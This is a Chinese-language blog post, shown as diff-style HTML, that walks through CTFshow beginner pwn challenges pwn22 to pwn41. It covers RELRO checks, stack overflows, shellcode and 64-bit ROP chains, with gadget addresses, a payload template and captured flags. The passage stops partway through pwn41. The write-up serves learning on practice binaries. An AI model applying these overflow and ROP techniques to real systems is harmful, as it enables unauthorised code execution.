+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758941542364-84e09f56-80aa-4a4b-9543-56356bb6b58d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758942708106-39323cfa-85ef-4401-8a73-52afcfb20917.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758942641001-6372b5de-3dab-4e38-ac19-7f4f483a9c9c.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758942892411-b6db274a-6ae3-4c3a-a320-cef208ff7475.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758943614747-d82b50af-b274-4b7a-837e-2cd20d3ca38b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758943639003-d7958330-900e-404a-885a-f77a4a17dd02.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758943689720-c1e3c7b9-7cf1-4e73-9926-7ddd2040587e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758943771069-bd513695-955a-47ae-8e78-79fe5d599938.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758943776898-179026ed-e3f9-4a0c-84fe-9cb958f77bc3.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758943834184-2b7c82a8-6926-4ce7-8768-1d9669efa7bd.png">
+<meta property="article:published_time" content="2025-09-29T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-11-05T11:28:19.690Z">
+<meta property="article:author" content="Meiyouqian">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758501334727-75876008-54c3-40c0-a957-ea2c01fe8caf.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>CTFshow-Pwn-9月记录 - 玫幽倩的小博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+<link rel="stylesheet" href="/css/mk.css">
+<link rel="stylesheet" href="/css/selection.css">
+<link rel="stylesheet" href="/css/glassBg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"mei-you-qian.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>玫幽倩</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/beijing.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CTFshow-Pwn-9月记录"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-09-30 00:00" pubdate>
+          2025年9月30日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          34 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CTFshow-Pwn-9月记录</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>对于pwn入门的一系列题目有了一个明确的做法</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758501334727-75876008-54c3-40c0-a957-ea2c01fe8caf.png" srcset="/img/loading.gif" lazyload></p>
+<p>对于.got和.got.plt是否可写可以直接参照这个表搜索</p>
+<p>然后这个RELRO可以直接checksec出，方便明确了不少，我觉得我之前就是纯瞎做，做到哪算哪</p>
+<p>然后再去查地址就行</p>
+<p>objdump -h pwn20</p>
+<p>或者readelf -S .&#x2F;pwn20 |grep ‘.got’</p>
+<p>都可以很快啊查出这些内容，因此pwn20和pwn21都应该这样子做，之前的懒得改了，我们直接看pwn22</p>
+<h2 id="pwn22"><a href="#pwn22" class="headerlink" title="pwn22"></a>pwn22</h2><p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758501547909-1eae7d3e-9796-4327-a679-3f0bac655bd3.png" srcset="/img/loading.gif" lazyload></p>
+<p>pwn22就像我刚刚说的，我不多写了</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758501604455-d68b7632-5f85-4b11-89d5-d1a05c2fed00.png" srcset="/img/loading.gif" lazyload></p>
+<p>Full RELRO，全部不可读不可写</p>
+<p>然后查</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758501701997-62c68d80-12d6-465a-ab59-0501e7e4e023.png" srcset="/img/loading.gif" lazyload></p>
+<p>只有.got表，没有.got.plt表</p>
+<p>思路清晰，我们得到了最后的flag</p>
+<p>ctfshow{0_0_0x600fc0}</p>
+<p>很明确，就该这样子</p>
+<h2 id="pwn23"><a href="#pwn23" class="headerlink" title="pwn23"></a>pwn23</h2><p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758516477583-7b9dd84a-1c20-43bf-8658-a146bf0eda81.png" srcset="/img/loading.gif" lazyload></p>
+<p>pwn23就是简单的ssh连接</p>
+<p>我们尝试拿xshell连接一下</p>
+<p>用户名和密码都有了，很容易就能连上</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758516615322-eb9a45f9-8f49-444a-b629-775259a4994a.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758516715923-62263ce5-c4db-4e2f-9a3a-04900a293c85.png" srcset="/img/loading.gif" lazyload></p>
+<p>问我怎么input</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758516832480-cb50fe9b-2b55-4d70-a331-161c4060925b.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边给提示了，没有进行堆栈保护，那我们制造栈溢出看看</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758516909563-3c9d5f9c-c9d7-4251-9fc8-db66653276eb.png" srcset="/img/loading.gif" lazyload></p>
+<p>马上就有flag了</p>
+<p>ctfshow{38a46cc7-6c9f-48c7-b54e-cec049a1aaef}</p>
+<h2 id="pwn24"><a href="#pwn24" class="headerlink" title="pwn24"></a>pwn24</h2><p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758516945564-574e3b13-8cca-402e-a3af-dbf3aa7d30e0.png" srcset="/img/loading.gif" lazyload></p>
+<p>确实是做了一些比赛再看就不一样了，这个shellcraft我昨天做moectf刚刚用到过</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758517461339-dac0c217-11f4-45aa-b728-bcdec1384f04.png" srcset="/img/loading.gif" lazyload></p>
+<p>看提示，堆栈内存区域是可执行的</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758517568999-e41003a8-35eb-43b4-8436-daf579ebfcc1.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到会直接执行在buf缓冲区的任何机器码</p>
+<p>我们直接构造shellcode打穿就行了</p>
+<p>直接远程</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758534767054-48dc2591-94fc-4d71-9373-5902c9cf783f.png" srcset="/img/loading.gif" lazyload></p>
+<p>很简单的代码</p>
+<p>然后直接运行即可</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758534755136-c53d755c-7d43-4792-82aa-4826c25f98c8.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到flag</p>
+<h2 id="pwn35"><a href="#pwn35" class="headerlink" title="pwn35"></a>pwn35</h2><p>好我们看看35</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758534884888-f4780ad1-f770-4faf-835b-182882cf803c.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758534959085-53da2310-a0cf-4242-b438-20db47b81e34.png" srcset="/img/loading.gif" lazyload></p>
+<p>看看主函数</p>
+<p>这不是和pwn23差不多的吗</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758535094265-816c4d5c-c9cf-4593-8560-61b052bad63f.png" srcset="/img/loading.gif" lazyload></p>
+<p>先ssh连接上</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758535127129-a106faa1-f8e7-4b5c-b8a9-9be29d99d8b7.png" srcset="/img/loading.gif" lazyload></p>
+<p>不是我说这真的和pwn23一模一样吧</p>
+<p>都是直接多写点参数，栈溢出就自动跳出flag了</p>
+<p>ctfshow{cb00340d-009c-428d-8151-d49d5c07a4f2}</p>
+<h2 id="pwn36"><a href="#pwn36" class="headerlink" title="pwn36"></a>pwn36</h2><p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758535288064-0efc3cd7-7dd1-4508-9214-67d889c331e7.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个应该就是正常的栈溢出题目了</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758535997115-b64ece30-4377-4f6c-b027-71efa109553d.png" srcset="/img/loading.gif" lazyload></p>
+<p>先看几位，是32位的</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536023758-fcf9a7a2-7b54-4b69-bb73-ac145f53adff.png" srcset="/img/loading.gif" lazyload></p>
+<p>看看这个ctfshow函数</p>
+<p>是一个gets函数，一会儿填着</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536055096-f4efba1c-35d5-4ee8-805d-52626b2d2f0d.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后这个填满0x28+4就溢出了</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536042983-83f7314d-c592-4b6b-8297-295326c1396b.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据payload构造</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536108402-5fc893a2-87ab-4e53-aa6d-133e62871502.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们找一下后门地址</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536152729-6cc0f164-4a73-47cf-8531-6ae24a8c4d26.png" srcset="/img/loading.gif" lazyload></p>
+<p>明显是这个get_flag的函数，我们一会儿传到这个函数地址来即可</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536526352-c0e7a0ca-c0f8-4c06-a0cb-7f607e53700f.png" srcset="/img/loading.gif" lazyload></p>
+<p>后门地址是0x08048586</p>
+<p>编写程序</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536561599-026baf86-759e-479c-bdd7-e8750117e434.png" srcset="/img/loading.gif" lazyload></p>
+<p>运行程序</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536517073-3421a121-d315-455b-8383-e649b24a3075.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到flag：ctfshow{7793e126-cc36-47f0-98d2-ca7ae3f22134}</p>
+<h2 id="pwn37"><a href="#pwn37" class="headerlink" title="pwn37"></a>pwn37</h2><p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536944474-9a9f4fbc-b634-4954-9c28-49541b0322fe.png" srcset="/img/loading.gif" lazyload></p>
+<p>这一题是直接给了system(“&#x2F;bin&#x2F;sh”)</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537015098-b203d78f-2d84-4582-ac2a-9cdfc6209c9b.png" srcset="/img/loading.gif" lazyload></p>
+<p>结合题意也该是个32位的</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537039436-fe7bdd8b-26e8-4b26-8719-c4e64a8a24e6.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边还是ctfshow（）</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537055750-e86e9b59-caec-4ade-a3fc-7796f8861b9e.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到允许我们写入0x32的内容，但是buf里只能存储</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537077334-f5b26ccc-a27f-4f89-917c-111259f252fd.png" srcset="/img/loading.gif" lazyload></p>
+<p>0x12+4个内容，明显栈溢出</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536108402-5fc893a2-87ab-4e53-aa6d-133e62871502.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们根据这个，buf栈溢出后直接跟上system的地址即可</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537134652-e3e06428-bbb5-4802-8f52-6f7f945c9fb1.png" srcset="/img/loading.gif" lazyload></p>
+<p>后门函数直接写脸上了</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537151994-cc57d184-023f-43c4-8f3c-8036d396d4ce.png" srcset="/img/loading.gif" lazyload></p>
+<p>地址为0x8048521</p>
+<p>我们编写代码</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537420755-d8655a55-e9c4-418c-ab42-5ce12f67c423.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后执行一下，ls再cat即可</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537445658-9617810f-fbf8-4614-b3a9-37c887c0df66.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到flag：ctfshow{d861f68f-d73a-40dd-ad68-5f24f0802892}</p>
+<h2 id="pwn38"><a href="#pwn38" class="headerlink" title="pwn38"></a>pwn38</h2><p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537476648-0b79ae3b-b707-4a3f-9c4d-59be8d275f47.png" srcset="/img/loading.gif" lazyload></p>
+<p>本质是一样的和上一题，无非是构造的格式不一样</p>
+<p>然而作为一道64位的题目，我们必须还要考虑栈对齐的问题，即十六字节对齐，否则函数可能崩溃</p>
+<p>我们必须在后门函数调用前加一个ret的地址</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758538244808-50203fb4-273e-4fe6-970c-f244440f157d.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758538293367-fc7c8225-d6d3-4d1b-a71b-27e875d43b62.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边可以是0x00040065B,也可以是0x040066D</p>
+<p>直接构造</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537743431-b02268fb-6457-4759-aa93-b26a43d27faf.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537752134-ad5961e5-2fe6-40d6-bc65-fcbdcb1cdb7d.png" srcset="/img/loading.gif" lazyload></p>
+<p>还是可以填入0x32个，但是这边只能容纳0xA+8个</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537800386-bcb77ab7-5479-4d91-a4a6-3d41c9c13944.png" srcset="/img/loading.gif" lazyload></p>
+<p>后门地址0x400657</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758538695198-d83ad32f-5885-4720-861b-10240561c43d.png" srcset="/img/loading.gif" lazyload></p>
+<p>构造payload，运行</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758538717725-420b043a-09bb-403c-8558-a6d64cd15de5.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功得到flag：ctfshow{2dfef1af-c2ac-4ca6-9130-d0427cf52095}</p>
+<h2 id="pwn39"><a href="#pwn39" class="headerlink" title="pwn39"></a>pwn39</h2><p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758538766848-0e5bd927-5be7-435b-8cfc-758817032f7b.png" srcset="/img/loading.gif" lazyload></p>
+<p>pwn39，这边system和&#x2F;bin&#x2F;sh分开了，需要传参了</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536108402-5fc893a2-87ab-4e53-aa6d-133e62871502.png" srcset="/img/loading.gif" lazyload></p>
+<p>先溢出，然后写system地址，最后写&#x2F;bin&#x2F;sh字符所在地址即可</p>
+<p>简简单单，我们打开看看</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758538916680-7c967d98-e6c2-4cdd-a4d0-8abd32cfcf47.png" srcset="/img/loading.gif" lazyload></p>
+<p>因为暑假上过，感觉简单不少</p>
+<p>先找溢出</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758538934911-69409bea-9805-4bb4-a5a8-e64f4de67321.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758538942448-e54fa7d5-52ef-41cd-81ee-ef30d50bbe25.png" srcset="/img/loading.gif" lazyload></p>
+<p>padding&#x3D;0x12+4</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539109116-3366cda2-0a9a-447e-9bff-39f8833c0c47.png" srcset="/img/loading.gif" lazyload></p>
+<p>在hint函数可以找到两大将</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539171560-489fbb22-a642-4641-bbb2-c7cf2c541ac6.png" srcset="/img/loading.gif" lazyload></p>
+<p>system地址为0x080483A0</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539407586-cf5d277d-10e5-4798-b3fb-f0ab14520588.png" srcset="/img/loading.gif" lazyload></p>
+<p>&#x2F;bin&#x2F;sh地址为0x8048750</p>
+<p>不需要返回地址，我们直接提权就已经完成我们想要的了，所以返回地址直接就是0</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539470699-136b235f-fc77-480f-9211-5cb2cdd28578.png" srcset="/img/loading.gif" lazyload></p>
+<p>如图运行</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539463393-e39d704b-99c0-466a-9750-38d65269506b.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到flag：ctfshow{50cbf17b-b14b-424f-af7e-6e5871e2772e}</p>
+<h2 id="pwn40"><a href="#pwn40" class="headerlink" title="pwn40"></a>pwn40</h2><p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539508546-ac6c79f8-257d-44fd-9231-315cad05ffae.png" srcset="/img/loading.gif" lazyload></p>
+<p>其实就是39的进阶版</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536108402-5fc893a2-87ab-4e53-aa6d-133e62871502.png" srcset="/img/loading.gif" lazyload></p>
+<p>考虑栈对齐，64位传参搞得很恶心</p>
+<p>payload&#x3D;b”a”*padding+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system_addr)（因为这边返回地址在最后，干脆不写了）</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758540145940-194db70a-072f-4123-9192-b703a9fd1955.png" srcset="/img/loading.gif" lazyload></p>
+<p>大致的思路如上</p>
+<p>大概构造这个就够了，我们一个个找</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539708147-28249dd9-5c4b-4e33-b001-a98ca66777be.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539713418-d3f182c2-c677-43c8-ac5d-dd236313b873.png" srcset="/img/loading.gif" lazyload></p>
+<p>padding&#x3D;0xA+8</p>
+<p>后边俩要用这个找</p>
+<p>ROPgadget –binary “pwn40” –only “pop|ret”</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539773996-add85bec-851f-41c7-ae5c-84c32eae7d46.png" srcset="/img/loading.gif" lazyload></p>
+<p>好我们看看</p>
+<p>pop rdi在0x004007e3</p>
+<p>ret在0x004004fe</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539831849-6860772b-3fa1-4447-be8a-9849c29b64af.png" srcset="/img/loading.gif" lazyload></p>
+<p>依旧hint</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539841400-4385c1d1-aed9-4704-816c-ee8457fcc7d8.png" srcset="/img/loading.gif" lazyload></p>
+<p>system_addr&#x3D;0x0400520</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539881868-670c45f5-904c-4b98-bcc4-3fe7e515be14.png" srcset="/img/loading.gif" lazyload></p>
+<p>bin_sh&#x3D;0x0400808</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758540172368-b8102b4e-7f98-4e8c-9f3f-15777673d914.png" srcset="/img/loading.gif" lazyload></p>
+<p>按部就班即可得到</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758540206740-a04f9ee3-b13a-44cf-ab07-2de9b33d1ed7.png" srcset="/img/loading.gif" lazyload></p>
+<p>运行得到flag：ctfshow{fdad54ce-2c32-4657-b1b2-8bec9a592451}</p>
+<h2 id="pwn41"><a href="#pwn41" class="headerlink" title="pwn41"></a>pwn41</h2><p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758540457937-32e3ead7-96f7-42ae-a3d7-ad2206e1f3bb.png" srcset="/img/loading.gif" lazyload></p>
+<p>32位的system，竟然没有&#x2F;bin&#x2F;sh了？</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758540537388-eb5ecc35-a20a-4f70-927b-f5cca21eb118.png" srcset="/img/loading.gif" lazyload></p>
+<p>首先确定栈溢出漏洞始终存在</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758540563804-5c57a79a-1552-4aad-becc-62bcc6fb8759.png" srcset="/img/loading.gif" lazyload></p>
